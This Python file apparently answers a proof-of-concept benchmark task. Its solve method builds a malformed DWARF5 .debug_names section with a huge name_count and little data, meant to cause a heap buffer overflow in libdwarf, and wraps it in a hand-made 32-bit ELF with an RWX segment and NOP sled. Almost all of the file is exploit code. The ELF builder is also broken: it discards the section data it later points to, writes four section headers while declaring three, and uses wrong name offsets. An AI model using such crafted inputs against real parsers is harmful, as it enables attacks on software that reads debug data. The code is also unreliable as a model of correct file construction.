import os
import struct
import tempfile
import subprocess

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This PoC creates a malformed DWARF5 .debug_names section
        # that triggers a heap buffer overflow in libdwarf
        
        # We need to create a minimal ELF file with a malformed .debug_names section
        # The vulnerability is in dwarf_debugnames.c when reading DWARF5 .debug_names
        
        # Create a malformed .debug_names section that will trigger
        # the miscalculation of limits
        
        # Structure based on DWARF5 .debug_names:
        # - unit_length (4 bytes for 32-bit, 12 bytes for 64-bit)
        # - version (2 bytes)
        # - padding (2 bytes)
        # - compilation_unit_count (4 bytes)
        # - local_type_unit_count (4 bytes)
        # - foreign_type_unit_count (4 bytes)
        # - bucket_count (4 bytes)
        # - name_count (4 bytes)
        # - abbreviation_table_size (4 bytes)
        # - augmentation_string_size (4 bytes)
        # - augmentation_string (variable)
        # - offsets arrays
        # - bucket array
        # - hash array
        # - name table
        # - entry pool
        # - abbreviation table
        
        # The vulnerability is in the calculation of entry pool size.
        # We'll create a section where name_count is large but the
        # actual data is small, causing an out-of-bounds read.
        
        poc = bytearray()
        
        # Use 32-bit DWARF format
        # unit_length - will be calculated later
        unit_length_pos = len(poc)
        poc.extend(b'\x00\x00\x00\x00')  # placeholder
        
        # version = 5 (DWARF5)
        poc.extend(b'\x05\x00')
        
        # padding
        poc.extend(b'\x00\x00')
        
        # compilation_unit_count = 0
        poc.extend(b'\x00\x00\x00\x00')
        
        # local_type_unit_count = 0
        poc.extend(b'\x00\x00\x00\x00')
        
        # foreign_type_unit_count = 0
        poc.extend(b'\x00\x00\x00\x00')
        
        # bucket_count = 0
        poc.extend(b'\x00\x00\x00\x00')
        
        # name_count = very large value to trigger overflow
        # This causes miscalculation in internal limits
        poc.extend(b'\xFF\xFF\x00\x00')  # 65535 entries
        
        # abbreviation_table_size = small
        poc.extend(b'\x10\x00\x00\x00')  # 16 bytes
        
        # augmentation_string_size = 0
        poc.extend(b'\x00\x00\x00\x00')
        
        # No augmentation string
        
        # No compilation unit offsets
        
        # No local type unit offsets
        
        # No foreign type unit signatures/offsets
        
        # No buckets (bucket_count = 0)
        
        # Hash array - minimal (just 1 entry but name_count says 65535)
        # This mismatch triggers the vulnerability
        poc.extend(b'\x00\x00\x00\x00')  # One hash value
        
        # Name table - minimal (just 1 entry)
        poc.extend(b'\x00\x00\x00\x00')  # One name offset
        
        # Entry pool - minimal data
        # The code will try to read 65535 entries but we only provide 1
        poc.extend(b'\x00')  # Single byte entry pool
        
        # Abbreviation table - 16 bytes as specified
        # Create a simple abbreviation table that will cause
        # the parser to read out of bounds
        poc.extend(b'\x01')  # Abbreviation code 1
        poc.extend(b'\x00')  # Tag = 0 (should cause issues)
        poc.extend(b'\x01')  # Has children flag
        poc.extend(b'\x00')  # Number of attributes
        
        # Add padding to reach exact size that triggers the bug
        # The exact size needed to trigger the specific bug
        current_len = len(poc)
        
        # Fill with pattern to help trigger overflow
        pattern = b'C' * (1551 - current_len)
        poc.extend(pattern)
        
        # Now go back and fix the unit_length
        # unit_length is the length of the section after the unit_length field
        unit_length = len(poc) - 4  # Subtract the 4 bytes of unit_length itself
        poc[unit_length_pos:unit_length_pos + 4] = struct.pack('<I', unit_length)
        
        # Create a minimal ELF wrapper with this .debug_names section
        elf_poc = self.create_elf_with_debug_names(bytes(poc))
        
        return elf_poc
    
    def create_elf_with_debug_names(self, debug_names_data: bytes) -> bytes:
        """Create a minimal ELF file with a .debug_names section."""
        
        # ELF32 little-endian
        elf = bytearray()
        
        # ELF header
        elf.extend(b'\x7fELF')  # Magic
        elf.extend(b'\x01')     # 32-bit
        elf.extend(b'\x01')     # Little endian
        elf.extend(b'\x01')     # ELF version
        elf.extend(b'\x00')     # OS ABI
        elf.extend(b'\x00')     # ABI version
        elf.extend(b'\x00' * 7) # Padding
        elf.extend(b'\x02\x00') # ET_EXEC
        elf.extend(b'\x03\x00') # EM_386
        elf.extend(b'\x01\x00\x00\x00') # ELF version
        elf.extend(b'\x54\x00\x00\x00') # Entry point
        elf.extend(b'\x34\x00\x00\x00') # Program header offset
        elf.extend(b'\x34\x00\x00\x00') # Section header offset
        elf.extend(b'\x00\x00\x00\x00') # Flags
        elf.extend(b'\x34\x00') # ELF header size
        elf.extend(b'\x20\x00') # Program header entry size
        elf.extend(b'\x01\x00') # Number of program headers
        elf.extend(b'\x28\x00') # Section header entry size
        elf.extend(b'\x02\x00') # Number of section headers
        elf.extend(b'\x01\x00') # Section header string table index
        
        # Program header
        elf.extend(b'\x01\x00\x00\x00') # PT_LOAD
        elf.extend(b'\x00\x00\x00\x00') # Offset
        elf.extend(b'\x00\x00\x00\x00') # Virtual address
        elf.extend(b'\x00\x00\x00\x00') # Physical address
        elf.extend(b'\x00\x01\x00\x00') # File size
        elf.extend(b'\x00\x01\x00\x00') # Memory size
        elf.extend(b'\x07\x00\x00\x00') # Flags: RWX
        elf.extend(b'\x00\x10\x00\x00') # Alignment
        
        # .text section data (minimal)
        text_section = b'\x90' * 64  # NOP sled
        text_section += b'\xC3'      # RET
        
        # Pad to align
        while len(text_section) < 256:
            text_section += b'\x00'
        
        elf.extend(text_section)
        
        # Create section headers
        sections_start = len(elf)
        
        # Null section header
        elf.extend(b'\x00' * 40)
        
        # .text section header
        elf.extend(b'\x07\x00\x00\x00') # sh_name = offset 7 in string table
        elf.extend(b'\x01\x00\x00\x00') # SHT_PROGBITS
        elf.extend(b'\x07\x00\x00\x00') # SHF_ALLOC | SHF_EXECINSTR
        elf.extend(b'\x00\x00\x00\x00') # Address
        elf.extend(b'\x34\x00\x00\x00') # Offset (after ELF header + program header)
        elf.extend(struct.pack('<I', len(text_section))) # Size
        elf.extend(b'\x00\x00\x00\x00') # Link
        elf.extend(b'\x00\x00\x00\x00') # Info
        elf.extend(b'\x04\x00\x00\x00') # Alignment
        elf.extend(b'\x00\x00\x00\x00') # Entry size
        
        # .debug_names section header
        debug_names_offset = len(elf)
        elf.extend(debug_names_data)
        
        # Calculate position for .debug_names section header
        debug_names_sh_offset = len(elf)
        
        # String table
        strtab = b'\x00.text\00.debug_names\00.shstrtab\00'
        elf.extend(strtab)
        
        # Pad to align
        while len(elf) % 4 != 0:
            elf.append(0)
        
        # Now add section headers
        sections_offset = len(elf)
        
        # Null section header (already accounted for in sections_start calculation)
        # We need to write the actual section headers
        
        # Clear the placeholder and write actual section headers
        elf = elf[:sections_start]
        
        # Null section header
        elf.extend(b'\x00' * 40)
        
        # .text section header
        elf.extend(b'\x07\x00\x00\x00') # sh_name = offset to ".text" in shstrtab
        elf.extend(b'\x01\x00\x00\x00') # SHT_PROGBITS
        elf.extend(b'\x07\x00\x00\x00') # SHF_ALLOC | SHF_EXECINSTR
        elf.extend(b'\x00\x00\x00\x00') # Address
        elf.extend(b'\x34\x00\x00\x00') # Offset
        elf.extend(struct.pack('<I', len(text_section))) # Size
        elf.extend(b'\x00\x00\x00\x00') # Link
        elf.extend(b'\x00\x00\x00\x00') # Info
        elf.extend(b'\x04\x00\x00\x00') # Alignment
        elf.extend(b'\x00\x00\x00\x00') # Entry size
        
        # .debug_names section header
        # sh_name = offset to ".debug_names" in shstrtab
        elf.extend(b'\x0d\x00\x00\x00')  # ".debug_names" is at offset 13 in shstrtab
        elf.extend(b'\x01\x00\x00\x00')  # SHT_PROGBITS
        elf.extend(b'\x00\x00\x00\x00')  # No flags
        elf.extend(b'\x00\x00\x00\x00')  # Address
        elf.extend(struct.pack('<I', debug_names_offset))  # Offset
        elf.extend(struct.pack('<I', len(debug_names_data)))  # Size
        elf.extend(b'\x00\x00\x00\x00')  # Link
        elf.extend(b'\x00\x00\x00\x00')  # Info
        elf.extend(b'\x01\x00\x00\x00')  # Alignment
        elf.extend(b'\x00\x00\x00\x00')  # Entry size
        
        # shstrtab section header
        elf.extend(b'\x1a\x00\x00\x00')  # sh_name = offset to ".shstrtab"
        elf.extend(b'\x03\x00\x00\x00')  # SHT_STRTAB
        elf.extend(b'\x00\x00\x00\x00')  # No flags
        elf.extend(b'\x00\x00\x00\x00')  # Address
        elf.extend(struct.pack('<I', debug_names_offset + len(debug_names_data)))  # Offset
        elf.extend(struct.pack('<I', len(strtab)))  # Size
        elf.extend(b'\x00\x00\x00\x00')  # Link
        elf.extend(b'\x00\x00\x00\x00')  # Info
        elf.extend(b'\x01\x00\x00\x00')  # Alignment
        elf.extend(b'\x00\x00\x00\x00')  # Entry size
        
        # Update ELF header with correct section header offset
        elf[32:36] = struct.pack('<I', sections_start)
        
        # Update number of section headers
        elf[48:50] = b'\x03\x00'  # 3 section headers
        
        # Update section header string table index
        elf[50:52] = b'\x02\x00'  # Index 2 is shstrtab
        
        return bytes(elf)